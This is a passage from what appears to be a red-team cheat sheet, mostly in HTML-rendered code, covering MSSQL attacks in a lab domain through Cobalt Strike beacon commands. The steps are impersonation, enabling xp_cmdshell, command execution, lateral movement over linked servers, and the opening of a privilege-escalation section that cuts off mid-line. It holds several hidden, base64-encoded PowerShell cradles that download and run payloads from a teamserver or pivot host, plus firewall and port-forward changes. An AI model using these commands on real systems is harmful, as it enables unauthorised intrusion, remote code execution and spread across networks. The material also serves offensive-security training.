class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span> <span class="hljs-literal">-QueryTarget</span> sql<span class="hljs-literal">-1</span>.cyberbotic.io<br>  <br></code></pre></td></tr></table></figure>
</li>
<li><p>MSSQL 服务器 - 模拟</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## MSSQL Server - Impersonation</span><br>  <br><span class="hljs-comment"># 1. Discover accounts which can be impersonated using impersonate module</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:impersonate<br>  <br><span class="hljs-comment"># 2-a. Impersonating a user account from current user using SQLRecon&#x27;s &quot;impersonation mode&quot; by prefixing the module name with an i and specifying the principal to impersonate.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>  <br><span class="hljs-comment"># 2-b. OR Impersonating a user account from current user using SQL Querie (EXECUTE AS)</span><br>SQL&gt; EXECUTE AS login = <span class="hljs-string">&#x27;DEV\mssql_svc&#x27;</span> ; <span class="hljs-built_in">SELECT</span> SYSTEM_USER;<br>SQL&gt; EXECUTE AS login = <span class="hljs-string">&#x27;DEV\mssql_svc&#x27;</span> ; <span class="hljs-built_in">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br><span class="hljs-comment"># Check the current user access using SQL Queries (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span><br>SQL&gt; <span class="hljs-built_in">SELECT</span> SYSTEM_USER;<br>SQL&gt; <span class="hljs-built_in">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br>  <br><span class="hljs-comment"># 3. Check if after impersonation , we have acccess to sysadmin or xp_cmdshell is enabled.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iQuery /i:DEV\mssql_svc /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>  <br><span class="hljs-comment"># 4. Enable xp_cmdshell when we have sysadmin access</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iEnableXp /i:DEV\mssql_svc<br></code></pre></td></tr></table></figure>
</li>
<li><p>MSSQL 服务器 - 命令执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## MSSQL Server - Command Execution</span><br>  <br><span class="hljs-comment"># 1. Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span><br>SQL&gt; <span class="hljs-built_in">SELECT</span> SYSTEM_USER;<br>SQL&gt; <span class="hljs-built_in">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /module:info<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br>  <br><span class="hljs-comment"># Enumerate for What roles we do have.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io,<span class="hljs-number">1433</span> /m:whoami<br>  <br><span class="hljs-comment"># 2. If current user have Sysadmin Access then Execute the command using inbuild module Invoke-SQLOSCmd from PowerUpSQL. (It automatically enables xp_cmdshell stored procedure and disables after code execution) -- Better OPSEC</span><br>beacon&gt; powerpick <span class="hljs-built_in">Invoke-SQLOSCmd</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-literal">-RawResults</span><br>  <br><span class="hljs-comment"># 3. Check if xp_cmdshell is enabled (0 -&gt; Disable, 1 -&gt; Enable)</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>  <br><span class="hljs-comment"># 4. Manually Enable the xp_cmdshell stored procedure (manually + PowerUpSql + SQLRecon)</span><br>SQL&gt; sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br>SQL&gt; sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;sp_configure &#x27;Show Advanced Options&#x27;, 1; RECONFIGURE;&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io,<span class="hljs-number">1433</span> /m:ienablexp /i:DEV\mssql_svc<br>  <br><span class="hljs-comment"># 5. Command Execution when xp_xmdshell is enabled</span><br>SQL&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;whoami&#x27;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;EXEC xp_cmdshell &#x27;whoami&#x27;&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io,<span class="hljs-number">1433</span> /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig<br>  <br><span class="hljs-comment"># 6. Get Remote shell or beacon access through Command Execution</span><br><span class="hljs-comment"># 6-a. Check if smb port (445) is open on target machine. So we can decide from SMB Payload or pivot listener. If smb port is available the use SMB payload else create a pivot listener.</span><br>beacon&gt; portscan <span class="hljs-number">10.10</span>.<span class="hljs-number">122.25</span> <span class="hljs-number">445</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io,<span class="hljs-number">1433</span> /m:ixpcmd /i:DEV\mssql_svc /c:<span class="hljs-string">&quot;ping -n 1 &lt;TEAMSERVER-IP&gt;&quot;</span><br><span class="hljs-comment"># 6-b. Check if the Target SQL Server can connect to teamserver , if not then enable the port forwarding and add a firewall rule. (Need Admin Privilege)</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;8080-In&quot;</span> <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br>  <br><span class="hljs-comment"># 6-c. For pivot listener</span><br><span class="hljs-comment"># Create a pivot listener beacon &gt; Pivoting &gt; Listener and keep the settings same and change only port and name.</span><br>beacon&gt; run netstat <span class="hljs-literal">-anop</span> tcp<br><span class="hljs-comment"># Setup a Scripted Web Delivery payload to /pivot endpoint and add the teamserver domain or IP and port 80 or 443 and select pivot listener.</span><br><span class="hljs-comment"># Now go to initial beacon machine and enable port forwarding and firewall to facilitate the powershell script delivery.</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;8080-In&quot;</span> <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">8080</span><br>beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span><br>beacon&gt; ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">123.102</span><br><span class="hljs-comment"># Now modify the payload as below</span><br>powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://&lt;Initial-beacon-IP&gt;:8080/pivot&#x27;))&quot;</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://&lt;Initial-beacon-IP&gt;:8080/pivot&#x27;))&quot;</span> | iconv <span class="hljs-literal">-t</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span><br><span class="hljs-comment"># Now execute the powershell script cradle in the target machine , and we should now have the access.</span><br><span class="hljs-comment"># 6-d. Download and execute cradle</span><br>powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://&lt;Initial-beacon-IP&gt;:8080/a&#x27;))&quot;</span><br><span class="hljs-comment"># Convert into encoded format to prevent issues with quotes mismatch</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.56.139:80/a&#x27;))&quot;</span> | iconv <span class="hljs-literal">-t</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span><br><span class="hljs-comment"># Updated powershell cradle</span><br>powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-enc</span> SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADEAMAAyAC8AcABpAHYAbwB0ACcAKQApAA==<br><span class="hljs-comment"># 6-e. Execute the payload</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:ixpcmd /i:DEV\mssql_svc /c:<span class="hljs-string">&quot;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADEAMAAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAnACkAKQA=&quot;</span><br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLQuery</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;EXEC xp_cmdshell &#x27;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAnACkAKQA=&#x27;&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&#x27;exec master..xp_cmdshell &quot;whoami&quot;&#x27;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;EXEC xp_cmdshell &#x27;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&#x27;&quot;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br>  <br>SQL&gt; <span class="hljs-built_in">SELECT</span> * FROM OPENQUERY(<span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span>, <span class="hljs-string">&#x27;select @@servername; exec xp_cmdshell &#x27;</span><span class="hljs-string">&#x27;powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br>  <br></code></pre></td></tr></table></figure>
</li>
<li><p>MSSQL 服务器 - 横向移动</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## MSSQL Server - Lateral Movement</span><br>  <br><span class="hljs-comment"># 1-a. Find the linked SQL Servers</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;select @@version&quot;</span><br>  <br><span class="hljs-comment"># 1-b. Execute query on the linked server</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /module:lquery /c:<span class="hljs-string">&quot;select @@version&quot;</span><br>  <br><span class="hljs-comment"># 2. Check if xp_cmdshell is already enabled</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /module:lquery /c:<span class="hljs-string">&quot;SELECT value FROM sys.configurations WHERE name = &#x27;xp_cmdshell&#x27;&quot;</span><br>  <br><span class="hljs-comment"># 3. Check if target SQLServer or its linked Server have syadmin access. (0 -&gt; Not SysAdmin , 1-&gt; Sysadmin)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /l:sql<span class="hljs-literal">-1</span>.cyberbotic.io /module:lwhoami<br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br>  <br>SQL&gt; <span class="hljs-built_in">SELECT</span> SYSTEM_USER;<br>SQL&gt; <span class="hljs-built_in">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br>  <br>SQL&gt; <span class="hljs-built_in">SELECT</span> * FROM OPENQUERY(<span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span>, <span class="hljs-string">&#x27;select @@servername&#x27;</span>);<br>SQL&gt; <span class="hljs-built_in">SELECT</span> * FROM OPENQUERY(<span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span>, <span class="hljs-string">&#x27;SELECT IS_SRVROLEMEMBER(&#x27;</span><span class="hljs-string">&#x27;sysadmin&#x27;</span><span class="hljs-string">&#x27;);&#x27;</span>);<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> <span class="hljs-string">&quot;sql-2.dev.cyberbotic.io,1433&quot;</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /module:info<br><span class="hljs-comment"># Enumerate for What roles we do have.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io,<span class="hljs-number">1433</span> /m:whoami<br>  <br><span class="hljs-comment"># 4-a. If syadmin access is enabled then , We can just execute command by enabling the xp_cmdshell, executing command and then disabling it.</span><br>SQL&gt; sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br>SQL&gt; sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>; RECONFIGURE;<br>  <br>SQL&gt; EXEC(<span class="hljs-string">&#x27;sp_configure &#x27;</span><span class="hljs-string">&#x27;show advanced options&#x27;</span><span class="hljs-string">&#x27;, 1; reconfigure;&#x27;</span>) AT [<span class="hljs-type">sql</span>-<span class="hljs-number">1</span><span class="hljs-type">.cyberbotic.io</span>]<br>SQL&gt; EXEC(<span class="hljs-string">&#x27;sp_configure &#x27;</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><span class="hljs-string">&#x27;, 1; reconfigure;&#x27;</span>) AT [<span class="hljs-type">sql</span>-<span class="hljs-number">1</span><span class="hljs-type">.cyberbotic.io</span>]<br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;sp_configure &#x27;Show Advanced Options&#x27;, 1; RECONFIGURE;&quot;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;&quot;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&#x27;exec master..xp_cmdshell &quot;whoami&quot;&#x27;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br><span class="hljs-comment"># 4-b. Check if we can impersonate any user, and then check if that user have sysadmin role.</span><br>execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:impersonate<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /<span class="hljs-built_in">h</span>:sql<span class="hljs-literal">-2</span>.dev.cyberbotic.io /m:iwhoami /i:DEV\mssql_svc<br>  <br><span class="hljs-comment">#5. Now run powershell payload / execute cradle to get the beacon.</span><br><span class="hljs-comment"># Follow point 6 of above Command Execution in MSSQL Notes.</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-SQLServerLinkCrawl</span> <span class="hljs-literal">-Instance</span> sql<span class="hljs-literal">-2</span> <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;EXEC xp_cmdshell &#x27;powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&#x27;&quot;</span> <span class="hljs-literal">-QueryTarget</span> eu<span class="hljs-literal">-sql</span><br>SQL&gt; <span class="hljs-built_in">SELECT</span> * FROM OPENQUERY(<span class="hljs-string">&quot;sql-1.cyberbotic.io&quot;</span>, <span class="hljs-string">&#x27;select @@servername; exec xp_cmdshell &#x27;</span><span class="hljs-string">&#x27;powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>)<br>  <br></code></pre></td></tr></table></figure>
</li>
<li><p>MSSQL 服务器 - 权限提升</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># MSSQL Server : Privilege Escalation - Service Account (SeImpersonate) to System </span><br>  <br><span class="hljs-comment"># The built-in service account that runs the MSSQL DB Service has the SeImpersonate Privilege by Default. This privilege can potentially be exploited to gain local admin access (System) using the SweetPotato exploit.</span><br><span class="hljs-comment"># After getting beacon to any initial or linked SQL Server , We can Priv Esc to  that server.</span><br>  <br><span class="hljs-comment"># 1. Use seatbelt utility to identify the privilege tokens available</span><br>beacon&gt; getuid<br>beacon&gt; shell whoami /priv<br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges<br>  <br><span class="hljs-comment"># 2. If seimpersonate privilege is found, we can use it to impersonate system account.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges<br>beacon&gt; shell whoami /priv<br>  <br><span class="hljs-comment"># 3. Use 